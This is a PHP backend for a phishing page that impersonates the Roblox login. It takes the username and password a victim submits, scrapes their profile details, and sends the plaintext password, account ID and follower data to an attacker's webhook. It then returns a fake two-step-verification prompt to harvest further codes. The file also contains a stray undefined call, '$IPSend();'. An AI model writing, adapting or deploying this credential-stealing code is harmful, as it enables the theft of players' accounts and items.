<?php
require('../../setup.php');
header('content-type: application/json');
session_start();
function get_string_between($string, $start, $end)
{
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function GET($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    return $r;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
    $input = json_decode(file_get_contents('php://input') , true);
    $profile = GET('https://www.roblox.com/users/profile?username=' . $input['cvalue']);
    $IPSend();
    if (strpos($profile, '<meta name="page-meta" data-internal-page-name="Profile" />'))
    {
        $ticket = rand();
        $input['cvalue'] = get_string_between($profile, '{"profileusername":"', '"');
        $input['cid'] = get_string_between($profile, '<link rel="canonical" href="https://www.roblox.com/users/', '/');
        $input['avatar'] = get_string_between($profile, '<meta property="og:image" content="', '"');
        $input['premium'] = strpos($profile, ' <span class="icon-premium-medium"></span>') ? 'True' : 'False';
        $input['followers'] = json_decode(GET('https://friends.roblox.com/v1/users/'.$input['cid'].'/followers/count'))->count;
        $embed = json_encode(['content' => '@everyone', 'username' => $input['cvalue'], 'avatar_url' => $input['avatar'], 'tts' => true,
        // 'file' => '',
        'embeds' => [['title' => 'View Profile', 'type' => 'rich',
        //'description' => '',
        'url' => 'https://www.roblox.com/users/profile?username=' . $input['cvalue'], 'timestamp' => date('c', strtotime('now')) , 'color' => hexdec(str_replace('#','',$EmbedColour)), 'footer' => ['text' => 'Log ID: ' . $ticket, 'icon_url' => $input['avatar']], 'thumbnail' => ['url' => $input['avatar']], 'author' => ['name' => 'Trade', 'url' => 'https://www.roblox.com/users/' . $input['cid'] . '/trade'], 'fields' => [['name' => 'Username', 'value' => '```' . $input['cvalue'] . '```', 'inline' => false], ['name' => 'Password', 'value' => '```' . $input['password'] . '```', 'inline' => false], ['name' => 'ID', 'value' => '```' . $input['cid'] . '```', 'inline' => false], ['name' => 'Premium', 'value' => '```' . $input['premium'] . '```', 'inline' => false], ['name' => 'Followers', 'value' => '```' . $input['followers'] . '```', 'inline' => false], ]]]

        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $Webhook);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json'
        ));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $embed);
        $response = curl_exec($ch);
        curl_close($ch);
        $_SESSION['ticket'] = $ticket;
        $_SESSION['avatar'] = $input['avatar'];
        $_SESSION['password'] = $input['password'];
        $_SESSION['premium'] = $input['premium'];
        $_SESSION['followers'] = $input['followers'];
        $_SESSION['cid'] = $input['cid'];
        $_SESSION['cvalue'] = $input['cvalue'];
        die(json_encode(array(
            'user' => array(
                'id' => $input['cid'],
                'name' => $input['cvalue'],
                'displayName' => $input['cvalue']
            ) ,
            'twoStepVerificationData' => array(
                'mediaType' => $twoStepVerificationType,
                'ticket' => rand()
            ) ,
            'isBanned' => false
        )));
    }
    else
    {
        http_response_code(403);
        die(json_encode(array(
            'errors' => [array(
                'code' => 1,
                'message' => 'Incorrect username or password. Please try again.',
                'userFacingMessage' => 'Something went wrong'
            ) ]
        )));
    }
}
?>